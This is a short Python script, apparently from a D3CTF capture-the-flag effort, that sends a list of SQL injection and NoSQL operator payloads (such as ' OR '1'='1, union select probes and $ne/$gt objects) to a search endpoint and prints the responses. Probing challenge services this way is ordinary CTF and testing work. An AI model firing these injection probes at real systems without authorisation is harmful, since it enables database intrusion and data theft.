from client import GhostClient
import json

c = GhostClient()
c.bootstrap()

tests = [
    "'",
    "''",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "%",
    "\\",
    "Frieren",
    "union select 1,2,3--",
    "' union select 1,2,3--",
    "\" union select 1,2,3--",
    "1' and 1=1--",
    "1' and 1=2--",
    "{ \"$ne\": null }",
    "{ \"$gt\": \"\" }",
    "admin",
    "flag",
    "D3CTF",
    "d3ctf"
]

for t in tests:
    try:
        res = c.request("search", {"q": t})
        rows_cnt = len(res.get("data", {}).get("rows", [])) if res.get("ok") else res.get("error")
        print(f"Query: {repr(t)} -> {res}")
    except Exception as e:
        print(f"Query: {repr(t)} -> Exception: {e}")
